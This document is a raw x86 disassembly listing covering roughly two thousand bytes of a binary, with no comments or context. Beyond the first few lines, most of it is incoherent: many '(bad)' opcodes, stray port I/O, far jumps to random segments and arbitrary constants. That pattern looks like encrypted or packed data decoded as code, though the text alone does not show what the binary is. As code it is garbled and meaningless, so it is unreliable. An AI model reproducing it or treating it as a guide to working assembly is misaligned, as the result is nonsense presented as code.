  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	pop    DWORD PTR [edx-0x50bfeffd]
  4115b1:	jl     0x41162f
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	sub    dh,ch
  4115b9:	dec    sp
  4115bb:	or     DWORD PTR [ecx+0x2d],ecx
  4115be:	adc    BYTE PTR [edx+edi*1],bl
  4115c1:	cmp    eax,0x2a2a89dd
  4115c6:	(bad)  
  4115c7:	fist   DWORD PTR [ecx-0x5110e578]
  4115cd:	xchg   esp,eax
  4115ce:	dec    esp
  4115cf:	xchg   esp,eax
  4115d0:	xor    DWORD PTR [ebx],ecx
  4115d2:	cmpps  xmm5,XMMWORD PTR [edx-0x3e],0xa8
  4115d7:	mov    dh,0x1a
  4115d9:	xchg   esi,eax
  4115da:	or     BYTE PTR [edi],dl
  4115dc:	and    BYTE PTR [ebx+0x133e183e],ch
  4115e2:	jne    0x4115f4
  4115e4:	add    esp,ebp
  4115e6:	je     0x411569
  4115e8:	or     al,dl
  4115ea:	loope  0x41159f
  4115ec:	loopne 0x4115b9
  4115ee:	js     0x411573
  4115f0:	mov    eax,ds:0xa630a66b
  4115f5:	sbb    ch,BYTE PTR ds:0x427aeaa
  4115fb:	and    ebx,DWORD PTR [edx-0x7612457d]
  411601:	data16 loopne 0x41162e
  411604:	mov    edi,0xc5032c37
  411609:	outs   dx,DWORD PTR ds:[esi]
  41160a:	cmp    ch,ah
  41160c:	out    dx,al
  41160d:	out    0x53,eax
  41160f:	cmc    
  411610:	call   0x745b:0x184f90fe
  411617:	xor    bh,BYTE PTR [ebx]
  411619:	mov    esi,0x9fbe55ab
  41161e:	imul   edi,ecx,0x5f
  411621:	jecxz  0x41167c
  411623:	add    eax,0x2f00568
  411628:	aad    0xc4
  41162a:	int    0x18
  41162c:	shl    DWORD PTR [ebx+0x5],1
  41162f:	mov    ebx,0x6712b637
  411634:	add    al,0xe4
  411636:	stc    
  411637:	pop    esp
  411638:	jne    0x411600
  41163a:	push   ecx
  41163b:	push   ebp
  41163c:	sub    dh,BYTE PTR [edi-0x61]
  41163f:	ins    BYTE PTR es:[edi],dx
  411640:	out    0x67,al
  411642:	(bad)  [ebx-0x59d3f023]
  411648:	dec    esp
  411649:	pop    edx
  41164a:	sbb    al,0x28
  41164c:	inc    esi
  41164d:	cmp    esp,DWORD PTR [edx+ebx*2]
  411650:	push   ebx
  411651:	(bad)  
  411652:	and    DWORD PTR [ebx-0xc],ebx
  411655:	adc    edi,DWORD PTR [edi-0x2f7ab3d4]
  41165b:	jne    0x4116ae
  41165d:	(bad)  
  41165e:	mov    esi,0xf39d7952
  411663:	loop   0x411664
  411665:	ror    DWORD PTR [ebx+0xa],0xc6
  411669:	mov    al,ds:0x9bfae8b3
  41166e:	in     al,0x10
  411670:	mov    al,0x20
  411672:	int    0x5c
  411674:	repnz sub DWORD PTR ds:0x98ac2528,esi
  41167b:	shl    bh,cl
  41167d:	ja     0x411622
  41167f:	sbb    eax,0xd5107ad4
  411684:	mov    BYTE PTR [esi],dl
  411686:	lock push ebx
  411688:	scas   eax,DWORD PTR es:[edi]
  411689:	jmp    0x1297:0x131ffde3
  411690:	jp     0x411635
  411692:	pop    esi
  411693:	test   al,0xd
  411695:	xor    DWORD PTR ds:0x5e2504ff,0x18f1be30
  41169f:	mov    esp,0x42840a76
  4116a4:	dec    esp
  4116a5:	(bad)  
  4116a6:	jbe    0x411671
  4116a8:	push   ebp
  4116a9:	sbb    esp,eax
  4116ab:	jl     0x4116ee
  4116ad:	xchg   edx,eax
  4116ae:	scas   al,BYTE PTR es:[edi]
  4116af:	push   ebp
  4116b0:	hlt    
  4116b1:	aad    0x70
  4116b3:	ds dec esp
  4116b5:	jb     0x41169c
  4116b7:	sbb    BYTE PTR [edx+0x79fa1253],0x2f
  4116be:	cli    
  4116bf:	test   BYTE PTR [ebp-0xe],0xdc
  4116c3:	not    bh
  4116c5:	sub    eax,DWORD PTR [ecx+0x64968a3a]
  4116cb:	repz mul BYTE PTR [ebx-0x164ca516]
  4116d2:	je     0x4116be
  4116d4:	dec    edi
  4116d5:	pop    edi
  4116d6:	rcl    DWORD PTR [ebp+0x7f],1
  4116d9:	enter  0x203a,0x52
  4116dd:	test   BYTE PTR ds:0xd6636b95,0xc8
  4116e4:	dec    ecx
  4116e5:	pusha  
  4116e6:	std    
  4116e7:	dec    eax
  4116e8:	out    0x62,eax
  4116ea:	lock pusha 
  4116ec:	xchg   edi,eax
  4116ed:	inc    eax
  4116ee:	xchg   ebp,eax
  4116ef:	retf   0x214c
  4116f2:	pop    ds
  4116f3:	outs   dx,BYTE PTR ds:[esi]
  4116f4:	pop    ebp
  4116f5:	add    al,BYTE PTR [edi]
  4116f7:	ror    DWORD PTR [edi-0x11],cl
  4116fa:	mov    DWORD PTR [esi-0x2],edx
  4116fd:	sbb    dl,dh
  4116ff:	iret   
  411700:	dec    eax
  411701:	repz and al,0x2f
  411704:	and    al,0x7b
  411706:	icebp  
  411707:	push   ebp
  411708:	es in  eax,dx
  41170a:	xchg   ecx,eax
  41170b:	mov    WORD PTR [ebx+0x1c],gs
  41170e:	sti    
  41170f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411710:	jo     0x4116ad
  411712:	mov    bl,0x92
  411714:	xlat   BYTE PTR ds:[ebx]
  411715:	mov    cl,0x25
  411717:	sbb    BYTE PTR [ecx+0x5b],bl
  41171a:	hlt    
  41171b:	mov    edx,0x46480024
  411720:	mov    bl,0xbd
  411722:	enter  0x115c,0x5d
  411726:	inc    edi
  411727:	mov    ecx,0x717efff3
  41172c:	add    DWORD PTR [eax],ebp
  41172e:	mov    al,BYTE PTR [edi]
  411730:	mov    ebx,edx
  411732:	xchg   DWORD PTR [edi],ecx
  411734:	push   ss
  411735:	or     ah,BYTE PTR [eax]
  411737:	mov    BYTE PTR [esi+0x26bebda6],bh
  41173d:	sbb    DWORD PTR ds:0x38e4749a,ebx
  411743:	out    dx,eax
  411744:	jns    0x41173c
  411746:	ins    DWORD PTR es:[edi],dx
  411747:	mov    fs,WORD PTR [esi+0x30]
  41174a:	out    0x15,eax
  41174c:	call   0xf05e727c
  411751:	rcr    DWORD PTR [eax-0x1cc6ef01],0x87
  411758:	adc    DWORD PTR [edi],esi
  41175a:	test   al,0x74
  41175c:	push   ss
  41175d:	(bad)  
  41175e:	(bad)  
  41175f:	icebp  
  411760:	push   0xffffffb7
  411762:	in     al,dx
  411763:	into   
  411764:	xor    eax,0x8c411508
  411769:	or     DWORD PTR ds:0x2b44dfb3,esp
  41176f:	pop    es
  411770:	pusha  
  411771:	mov    ds:0xd9c05d58,eax
  411776:	push   0xe20eeed5
  41177b:	leave  
  41177c:	xor    dh,0xc3
  41177f:	pop    eax
  411780:	call   0xb600689d
  411785:	jo     0x411760
  411787:	or     edx,ebx
  411789:	rcr    BYTE PTR [ebp-0x6a],0x47
  41178d:	push   es
  41178e:	rol    DWORD PTR [esi+ecx*1],1
  411791:	imul   edx,DWORD PTR [ebx-0x52],0xa662b0c0
  411798:	mov    esi,0x166cd393
  41179d:	pop    esp
  41179e:	push   ds
  41179f:	out    0xbf,eax
  4117a1:	ja     0x41173f
  4117a3:	stos   BYTE PTR es:[edi],al
  4117a4:	fdivr  DWORD PTR [eax]
  4117a6:	test   al,0x15
  4117a8:	push   esi
  4117a9:	inc    ebx
  4117aa:	mov    al,0x2f
  4117ac:	cmc    
  4117ad:	mov    cs,WORD PTR ds:0x6bca7a42
  4117b3:	push   eax
  4117b4:	fistp  QWORD PTR [ebx-0xfa9ab7b]
  4117ba:	jg     0x411777
  4117bc:	pop    eax
  4117bd:	add    al,0x8a
  4117bf:	jle    0x411821
  4117c1:	xor    ebp,edi
  4117c3:	and    al,0xd6
  4117c5:	sub    esi,DWORD PTR [esi-0x2aeda738]
  4117cb:	xchg   ecx,eax
  4117cc:	xchg   ecx,eax
  4117cd:	fsubr  DWORD PTR [ebp-0x3d9444eb]
  4117d3:	mov    bl,0x7
  4117d5:	mov    al,ds:0xb78511de
  4117da:	fidivr DWORD PTR [eax+ecx*8]
  4117dd:	(bad)  
  4117de:	push   ss
  4117df:	cdq    
  4117e0:	xchg   ecx,eax
  4117e1:	icebp  
  4117e2:	out    0x99,al
  4117e4:	cmp    ecx,DWORD PTR [ecx-0x46c7dc73]
  4117ea:	shl    esp,cl
  4117ec:	retf   
  4117ed:	add    DWORD PTR [eax+0x309fb7d3],esp
  4117f3:	push   ebx
  4117f4:	xchg   esi,eax
  4117f5:	ins    BYTE PTR es:[edi],dx
  4117f6:	fcmovne st,st(5)
  4117f8:	jmp    0x411864
  4117fa:	jo     0x411838
  4117fc:	ds aad 0x75
  4117ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411800:	out    dx,al
  411801:	pusha  
  411802:	aaa    
  411803:	push   esi
  411804:	scas   eax,DWORD PTR es:[edi]
  411805:	mov    WORD PTR [ecx-0x6e],ds
  411808:	les    ebx,FWORD PTR [eax]
  41180a:	(bad)  
  41180b:	in     al,0x9
  41180d:	xchg   esp,eax
  41180e:	and    ch,BYTE PTR ds:0xf4d4733c
  411814:	fimul  DWORD PTR [edi-0x54]
  411817:	sbb    al,0x90
  411819:	ror    BYTE PTR [ecx-0x2bd163fc],1
  41181f:	sbb    DWORD PTR [ebp+0x453085cb],eax
  411825:	fcomp  QWORD PTR [ecx+0x7e]
  411828:	dec    edx
  411829:	push   ds
  41182a:	xchg   edx,eax
  41182b:	add    eax,0xcc42a41f
  411830:	xor    BYTE PTR ds:0x57ecf9e7,cl
  411836:	sub    edi,eax
  411838:	jo     0x41182c
  41183a:	or     al,ah
  41183c:	ja     0x4117d3
  41183e:	jle    0x41186d
  411840:	or     eax,0x6c78573
  411845:	dec    ebx
  411846:	iret   
  411847:	xchg   esi,eax
  411848:	sub    al,0x7a
  41184b:	xchg   esi,eax
  41184c:	xchg   ebp,eax
  41184d:	(bad)  
  41184e:	jl     0x41180e
  411850:	fidivr DWORD PTR [ecx-0x28b1a665]
  411856:	in     eax,0x7f
  411858:	dec    eax
  411859:	int3   
  41185a:	and    BYTE PTR [edx+0x3221b67a],bl
  411860:	push   ecx
  411861:	fldcw  WORD PTR [ecx]
  411863:	lds    edx,FWORD PTR [edx-0xf81a604]
  411869:	add    bh,ch
  41186b:	xchg   esi,eax
  41186c:	imul   ebx,DWORD PTR [ebp+eax*1-0x6c77b84],0xffffffd2
  411874:	pop    ss
  411875:	jle    0x411844
  411877:	mov    esp,DWORD PTR [edi-0x7f]
  41187a:	pusha  
  41187b:	pop    eax
  41187c:	(bad)  
  41187d:	mov    ah,0x13
  41187f:	in     eax,dx
  411880:	out    0xab,al
  411882:	scas   eax,DWORD PTR es:[edi]
  411883:	adc    DWORD PTR [edx-0x59ec3eb7],ebx
  411889:	leave  
  41188a:	mov    dl,0x3e
  41188c:	xchg   edi,eax
  41188d:	push   ds
  41188e:	or     BYTE PTR [ebx-0xdf6eb2c],0x64
  411895:	psllq  mm1,mm4
  411898:	sub    al,0xdb
  41189a:	sbb    bh,cl
  41189c:	cmc    
  41189d:	retf   
  41189e:	sub    DWORD PTR [esi-0x2e],ebp
  4118a1:	lods   eax,DWORD PTR ds:[esi]
  4118a2:	xchg   ecx,eax
  4118a3:	push   ebx
  4118a4:	jnp    0x411884
  4118a6:	(bad)  
  4118a7:	fist   DWORD PTR [ebx+0x7b]
  4118aa:	popa   
  4118ab:	sub    al,0xe1
  4118ad:	test   eax,0x370f89a3
  4118b2:	icebp  
  4118b3:	ss and eax,0x762d3ffc
  4118b9:	dec    ecx
  4118ba:	mov    edx,0x1aeebe14
  4118bf:	int3   
  4118c0:	dec    ebp
  4118c1:	retf   
  4118c2:	int    0x8d
  4118c4:	in     eax,dx
  4118c5:	lods   al,BYTE PTR ds:[esi]
  4118c6:	pop    ss
  4118c7:	and    edi,esp
  4118c9:	pop    ss
  4118ca:	mov    bh,0x2f
  4118cc:	cmp    edi,DWORD PTR [edi]
  4118ce:	cwde   
  4118cf:	sub    eax,0x6119f56d
  4118d4:	or     dh,BYTE PTR [eax+0x12fe1b79]
  4118da:	sti    
  4118db:	jle    0x4118e6
  4118dd:	jo     0x411871
  4118df:	stos   DWORD PTR es:[edi],eax
  4118e0:	fild   QWORD PTR [edx]
  4118e2:	test   al,0xbc
  4118e4:	mov    dh,0x5
  4118e6:	xchg   esi,eax
  4118e7:	mov    ch,0x32
  4118e9:	jmp    0xfb5d619d
  4118ee:	cmc    
  4118ef:	adc    esp,esp
  4118f1:	or     al,0x5e
  4118f3:	inc    eax
  4118f4:	es sub eax,0xb225489
  4118fa:	in     eax,dx
  4118fb:	je     0x411892
  4118fd:	sti    
  4118fe:	adc    al,0x48
  411900:	jge    0x41188c
  411902:	xchg   esi,eax
  411903:	inc    esi
  411904:	stos   DWORD PTR es:[edi],eax
  411905:	adc    al,0x6c
  411907:	dec    ebx
  411908:	pop    ds
  411909:	mov    bh,0x50
  41190b:	add    esi,ebx
  41190d:	data16 cmp ah,bh
  411910:	push   ebx
  411911:	(bad)  
  411912:	gs (bad) 
  411914:	call   0xa7f5f026
  411919:	and    ecx,edi
  41191b:	cmp    eax,0x7da0bd57
  411920:	test   BYTE PTR [esi-0x2b704f57],bh
  411926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411927:	bound  ebp,QWORD PTR [eax+0x22]
  41192a:	ins    BYTE PTR es:[edi],dx
  41192b:	into   
  41192c:	push   ds
  41192d:	sbb    al,0x36
  41192f:	std    
  411930:	loop   0x4118d1
  411932:	inc    ebp
  411933:	pop    ecx
  411934:	adc    al,BYTE PTR [esi+0x31]
  411937:	ja     0x41192a
  411939:	iret   
  41193a:	ins    DWORD PTR es:[edi],dx
  41193b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193c:	arpl   WORD PTR [esi],ax
  41193e:	gs (bad) 
  411941:	or     al,0x33
  411943:	mov    ebp,0x798c2935
  411948:	jae    0x41193f
  41194a:	mov    di,0x13a6
  41194e:	jae    0x411954
  411950:	je     0x411901
  411952:	mov    edi,0x19b99eb9
  411957:	mov    dl,0x83
  411959:	mov    al,0x2d
  41195b:	repnz mov cl,0x40
  41195e:	mov    eax,DWORD PTR [ebx-0x34fa523f]
  411964:	sar    ah,cl
  411966:	xchg   edx,eax
  411967:	out    dx,eax
  411968:	loopne 0x41190f
  41196a:	dec    ecx
  41196b:	push   ebx
  41196c:	adc    DWORD PTR [ebx+0x274e9e44],eax
  411972:	inc    ecx
  411973:	pop    eax
  411974:	mov    ds:0xfa9e771b,eax
  411979:	mov    ecx,0xa6c414f8
  41197e:	jno    0x4119a6
  411980:	push   esi
  411981:	mov    al,0x1f
  411983:	or     eax,0x71c02240
  411988:	cli    
  411989:	into   
  41198a:	sahf   
  41198b:	inc    esi
  41198c:	test   BYTE PTR [ebx+ebp*8-0x4b],bl
  411990:	addr16 mov esi,0xdffc48cd
  411996:	sub    ebp,DWORD PTR [eax]
  411998:	std    
  411999:	cvtpi2ps xmm1,QWORD PTR [eax]
  41199c:	es sbb ch,0xdc
  4119a0:	or     ebp,DWORD PTR [ebx]
  4119a2:	xchg   esi,eax
  4119a3:	int3   
  4119a4:	mov    bh,0x57
  4119a6:	push   ds
  4119a7:	lods   al,BYTE PTR ds:[esi]
  4119a8:	aam    0x51
  4119aa:	(bad)  
  4119ac:	xchg   esp,eax
  4119ad:	xlat   BYTE PTR ds:[ebx]
  4119ae:	icebp  
  4119af:	fisttp WORD PTR [eax-0x7f]
  4119b2:	outs   dx,BYTE PTR ds:[esi]
  4119b3:	mov    ds:0xc9e61481,al
  4119b8:	push   0xd
  4119ba:	jp     0x4119a3
  4119bc:	clc    
  4119bd:	sub    al,0x4d
  4119bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119c0:	xchg   esp,eax
  4119c1:	fwait
  4119c2:	jbe    0x411a2b
  4119c4:	nop
  4119c5:	call   DWORD PTR [ecx+0x66]
  4119c8:	sar    DWORD PTR [esi-0x24],0xe3
  4119cc:	scas   eax,DWORD PTR es:[edi]
  4119cd:	mov    ebx,0x5d11ee6d
  4119d2:	sub    esi,DWORD PTR [edx]
  4119d4:	push   ecx
  4119d5:	jae    0x4119bd
  4119d7:	retf   
  4119d8:	ins    BYTE PTR es:[edi],dx
  4119d9:	mov    ds:0x96c31168,al
  4119de:	in     eax,0xb
  4119e0:	lahf   
  4119e1:	ja     0x411a2a
  4119e3:	cwde   
  4119e4:	dec    esp
  4119e5:	pop    ecx
  4119e6:	js     0x411973
  4119e8:	dec    ebp
  4119e9:	mov    eax,0x1ec12d0f
  4119ee:	ins    DWORD PTR es:[edi],dx
  4119ef:	or     eax,0x88e3c4c3
  4119f4:	sbb    ebp,DWORD PTR [edi+0xeca951]
  4119fa:	(bad)  
  4119fb:	add    eax,0x428bb337
  411a00:	dec    esp
  411a01:	sbb    eax,0xf0713982
  411a06:	mov    es,WORD PTR [ebp-0x16]
  411a09:	repnz mov ds:0xdde89a10,al
  411a0f:	push   0x2
  411a11:	(bad)  
  411a12:	lea    esi,[edx-0x7]
  411a15:	repz jae 0x4119ec
  411a18:	and    DWORD PTR ds:0x4cc4d276,0xc0ac4902
  411a22:	stc    
  411a23:	push   eax
  411a24:	push   ss
  411a25:	jbe    0x4119f8
  411a27:	push   edx
  411a28:	xchg   ecx,eax
  411a29:	sub    BYTE PTR [edi-0x64],dl
  411a2c:	add    BYTE PTR [eax+0x75],bl
  411a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a30:	test   BYTE PTR [ecx+0x6e972424],dh
  411a36:	add    eax,0xb5fc8db8
  411a3b:	cdq    
  411a3c:	test   eax,0x26c47fa6
  411a41:	std    
  411a42:	mov    dh,0x9c
  411a44:	addr16 mov edi,0x90012509
  411a4a:	shl    DWORD PTR [ebx-0x3],cl
  411a4d:	mov    esp,0xe4600668
  411a52:	fistp  DWORD PTR [ebp+0x3f]
  411a55:	inc    edi
  411a56:	xor    al,0x36
  411a58:	in     al,dx
  411a59:	out    dx,al
  411a5a:	xchg   edi,eax
  411a5b:	pop    ds
  411a5c:	pop    ss
  411a5d:	jmp    0xfb3bf0eb
  411a62:	daa    
  411a63:	adc    eax,0x6ec62f7e
  411a68:	das    
  411a69:	mov    cl,0x74
  411a6b:	adc    ch,cl
  411a6d:	mov    ah,0xff
  411a6f:	xor    BYTE PTR [eax],ch
  411a71:	sbb    edx,edx
  411a73:	out    0xd5,eax
  411a75:	jmp    0x125c3a64
  411a7a:	pop    ss
  411a7b:	pop    ebx
  411a7c:	jae    0x411a79
  411a7e:	ds push cs
  411a80:	cmp    al,0xb0
  411a82:	push   ebx
  411a83:	sub    eax,0x8d5b501f
  411a88:	out    dx,eax
  411a89:	jmp    0x3853:0xad26bdd6
  411a90:	sbb    eax,DWORD PTR ds:0x5e595514
  411a96:	mov    ebx,0x3cda03cf
  411a9b:	and    esi,DWORD PTR [eax+edx*4]
  411a9e:	mov    bl,0x96
  411aa0:	jp     0x411abe
  411aa2:	das    
  411aa3:	inc    esi
  411aa4:	xor    ecx,DWORD PTR [edi]
  411aa6:	(bad)  
  411aa8:	lock and al,ch
  411aab:	in     al,0xad
  411aad:	mov    BYTE PTR [ecx+0x6297967f],cl
  411ab3:	iret   
  411ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab5:	dec    edx
  411ab6:	in     al,dx
  411ab7:	retf   
  411ab8:	fist   DWORD PTR [edx+ecx*8+0x7e]
  411abc:	or     DWORD PTR [ebp-0x1068cc50],edi
  411ac2:	or     DWORD PTR [ebp+0x37],edi
  411ac5:	popf   
  411ac6:	clc    
  411ac7:	adc    BYTE PTR [esi-0xa23f511],0xbc
  411ace:	jnp    0x411a8c
  411ad0:	push   edx
  411ad1:	lea    ebx,[esi+0x1b98705b]
  411ad7:	mov    edx,0x910bad35
  411adc:	mov    eax,0x5becb062
  411ae1:	adc    al,0x16
  411ae3:	int    0x76
  411ae5:	ror    BYTE PTR [ebx],1
  411ae7:	cmp    DWORD PTR [ebp-0x19],edx
  411aea:	mov    ecx,0x4a824c10
  411aef:	lods   eax,DWORD PTR ds:[esi]
  411af0:	xor    al,0x2d
  411af2:	xlat   BYTE PTR ds:[ebx]
  411af3:	mov    esp,0xc36c9b81
  411af8:	loopne 0x411ac7
  411afa:	jne    0x411b61
  411afc:	nop
  411afd:	cld    
  411afe:	je     0x411a94
  411b00:	imul   ecx,DWORD PTR [ebp+0x2bed1de9],0x14
  411b07:	mov    esi,cs
  411b09:	add    esi,ebx
  411b0b:	retf   0x1134
  411b0e:	pop    ebx
  411b0f:	addr16 out 0x45,eax
  411b12:	push   es
  411b13:	rol    BYTE PTR [edi-0x79],1
  411b16:	add    DWORD PTR [ebx+0xe],0xffffff84
  411b1a:	into   
  411b1b:	pop    ds
  411b1c:	hlt    
  411b1d:	leave  
  411b1e:	clc    
  411b1f:	inc    edi
  411b20:	and    BYTE PTR [esi+ebx*1],bl
  411b23:	mov    bh,0x8e
  411b25:	cmp    eax,0xa1737c43
  411b2a:	add    al,0x82
  411b2c:	es or  bh,bh
  411b2f:	sti    
  411b30:	inc    ecx
  411b31:	inc    ebp
  411b32:	imul   esp,DWORD PTR [ecx-0x3e5e9ed1],0xffffff88
  411b39:	push   es
  411b3a:	dec    edx
  411b3b:	(bad)  
  411b3c:	jb     0x411b1d
  411b3e:	sub    dh,BYTE PTR [edi-0x17]
  411b41:	popf   
  411b42:	pop    edx
  411b43:	xchg   edx,eax
  411b44:	jecxz  0x411ba9
  411b46:	xor    ch,BYTE PTR ds:0xd2b3b2f3
  411b4c:	lods   al,BYTE PTR ds:[esi]
  411b4d:	shl    dh,cl
  411b4f:	repz mov ah,0x38
  411b52:	leave  
  411b53:	fisttp QWORD PTR [ecx+esi*1-0x3ff61658]
  411b5a:	out    dx,eax
  411b5b:	pop    eax
  411b5c:	sbb    DWORD PTR [edx-0x11ceef65],esp
  411b62:	sbb    dh,BYTE PTR [ecx-0x17cc720]
  411b68:	in     eax,dx
  411b69:	or     DWORD PTR [edx],ecx
  411b6b:	pop    edi
  411b6c:	inc    edi
  411b6d:	jp     0x411b48
  411b6f:	int    0xa5
  411b71:	mulps  xmm7,XMMWORD PTR [edi-0x2928b44f]
  411b78:	imul   ecx,edi,0x4a10ca14
  411b7e:	sbb    edx,DWORD PTR [edx]
  411b80:	clc    
  411b81:	jno    0x411bca
  411b83:	xor    al,0xd9
  411b85:	cwde   
  411b86:	inc    ebx
  411b87:	mov    ebp,DWORD PTR ds:0x2fb5f660
  411b8d:	push   esp
  411b8e:	in     al,0x7e
  411b90:	test   eax,0xdf545e97
  411b95:	popf   
  411b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b97:	push   esi
  411b98:	inc    ebp
  411b99:	stos   DWORD PTR es:[edi],eax
  411b9a:	jo     0x411b36
  411b9c:	inc    edi
  411b9d:	(bad)  
  411b9e:	retf   0x8d9c
  411ba1:	pop    ebp
  411ba2:	sar    BYTE PTR [ebx+0x29914bad],0xf6
  411ba9:	out    dx,eax
  411baa:	pusha  
  411bab:	fist   WORD PTR [ecx]
  411bad:	scas   eax,DWORD PTR es:[edi]
  411bae:	shl    BYTE PTR [eax],1
  411bb0:	out    dx,eax
  411bb1:	call   0x48f1:0xbadf2fd6
  411bb8:	push   ebp
  411bb9:	sbb    ebx,ecx
  411bbb:	jns    0x411b5b
  411bbd:	jl     0x411c27
  411bbf:	stc    
  411bc0:	sbb    BYTE PTR [ebp+0x71fbc9c4],dl
  411bc6:	stc    
  411bc7:	xchg   ebx,eax
  411bc8:	pop    esp
  411bc9:	pop    eax
  411bca:	(bad)  
  411bcb:	retf   
  411bcc:	dec    eax
  411bcd:	(bad)  
  411bcf:	xor    DWORD PTR [eax+0x710c0959],0x33
  411bd6:	mov    eax,DWORD PTR [esi]
  411bd8:	cli    
  411bd9:	or     eax,0x6e941ffa
  411bde:	fimul  WORD PTR [eax]
  411be0:	ret    0x1159
  411be3:	stc    
  411be4:	sbb    BYTE PTR [ebp-0x39],0xee
  411be8:	js     0x411c38
  411bea:	jmp    FWORD PTR [edi+0x31]
  411bed:	and    eax,0x771d58dd
  411bf2:	cmp    al,BYTE PTR [eax+ebp*4+0x45]
  411bf6:	and    BYTE PTR [eax],cl
  411bf8:	(bad)  
  411bf9:	pop    ecx
  411bfa:	int    0x98
  411bfc:	adc    DWORD PTR [ecx-0x1c1e3444],esi
  411c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c04:	stos   DWORD PTR es:[edi],eax
  411c05:	mov    dh,0xa2
  411c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c08:	lock sbb al,0xf8
  411c0b:	std    
  411c0c:	adc    ah,BYTE PTR ds:0xbd7290be
  411c12:	jmp    0x87f8:0x36dcc38e
  411c19:	jmp    FWORD PTR [edi-0x7f37b909]
  411c1f:	sbb    edx,DWORD PTR [edx-0x54b7709c]
  411c25:	in     eax,dx
  411c26:	xlat   BYTE PTR ds:[ebx]
  411c27:	cli    
  411c28:	ret    
  411c29:	mov    eax,0xe92dc46d
  411c2e:	mov    esi,0x57a3956f
  411c33:	not    edi
  411c35:	test   eax,0x55a7bbd6
  411c3a:	add    eax,0x1a5d5031
  411c3f:	jo     0x411c63
  411c41:	add    eax,0xa07c3fe
  411c46:	jmp    0x411bf0
  411c48:	(bad)  
  411c49:	push   0xffffffa2
  411c4b:	ficomp DWORD PTR [esi-0x7ccc917a]
  411c51:	cmc    
  411c52:	push   0xa2ff1a87
  411c57:	xor    esi,ebp
  411c59:	ficomp WORD PTR [ebx]
  411c5b:	sbb    BYTE PTR [edi],bl
  411c5d:	in     al,0x75
  411c5f:	out    dx,al
  411c60:	and    eax,0xbe40bb5f
  411c65:	(bad)  
  411c66:	mov    bl,0x5b
  411c68:	and    DWORD PTR [eax],edx
  411c6a:	inc    ebp
  411c6b:	ss push 0x6df8e032
  411c71:	nop
  411c72:	inc    edi
  411c73:	cmp    ah,BYTE PTR [ebx+0x26]
  411c76:	fs push edx
  411c78:	loope  0x411c2e
  411c7a:	xor    BYTE PTR [esi],0x5e
  411c7d:	jecxz  0x411c3b
  411c7f:	dec    ebx
  411c80:	xchg   ecx,eax
  411c81:	mov    BYTE PTR [edi+0x21aef2bc],bl
  411c87:	fdiv   DWORD PTR [ebx+0xf8e36e3]
  411c8d:	int3   
  411c8e:	test   ebx,esp
  411c90:	cmp    ecx,DWORD PTR [ebx+ebx*1-0x69]
  411c94:	retf   
  411c95:	and    ch,0x48
  411c98:	inc    ebp
  411c99:	jne    0x411c7a
  411c9b:	fisub  DWORD PTR [edx-0x7274068b]
  411ca1:	les    edx,FWORD PTR [edi]
  411ca3:	test   eax,0xf8082994
  411ca8:	xchg   edi,eax
  411ca9:	xor    ah,BYTE PTR [edx]
  411cab:	mov    edi,0x856b59bc
  411cb0:	push   ebx
  411cb1:	lock imul ecx,DWORD PTR [ebx+ebx*1],0xffffff99
  411cb6:	cmp    eax,0xd8dec89d
  411cbb:	mov    ds:0x163bf9c8,eax
  411cc0:	xchg   ebp,eax
  411cc1:	in     al,0x5c
  411cc3:	out    0xee,eax
  411cc5:	and    DWORD PTR [ebx+0x4a1de4e5],eax
  411ccb:	jecxz  0x411c67
  411ccd:	pop    ebp
  411cce:	jb     0x411c54
  411cd0:	add    eax,0x53f706fa
  411cd5:	lds    ecx,FWORD PTR [eax+0x21347c28]
  411cdb:	fwait
  411cdc:	cmp    BYTE PTR [esi-0x33],bh
  411cdf:	jg     0x411ca4
  411ce1:	and    esp,DWORD PTR [ebp+0x2b]
  411ce4:	dec    eax
  411ce5:	sbb    BYTE PTR [ebp-0x6a65e819],al
  411ceb:	pop    ds
  411cec:	pop    edx
  411ced:	jb     0x411c92
  411cef:	inc    edx
  411cf0:	pop    eax
  411cf1:	and    eax,0xb8254960
  411cf6:	outs   dx,DWORD PTR ss:[esi]
  411cf8:	pop    esi
  411cf9:	dec    edi
  411cfa:	dec    esp
  411cfb:	les    esi,FWORD PTR [ecx+0x3f3091ed]
  411d01:	(bad)  
  411d02:	xor    BYTE PTR [ecx],ch
  411d04:	out    dx,al
  411d05:	(bad)  
  411d06:	(bad)  
  411d07:	sbb    dl,BYTE PTR [edx]
  411d09:	fs mov esp,0xc9ff2972
  411d0f:	inc    edx
  411d10:	imul   ebp,DWORD PTR [edi+0x67],0xffffff9e
  411d14:	fistp  WORD PTR [ecx+0x5c9590b3]
  411d1a:	aam    0x7d
  411d1c:	inc    ebp
  411d1d:	fprem1 
  411d1f:	jecxz  0x411cbe
  411d21:	mov    bl,0x1e
  411d23:	jo     0x411d88
  411d25:	mov    ecx,0xcde3fb23
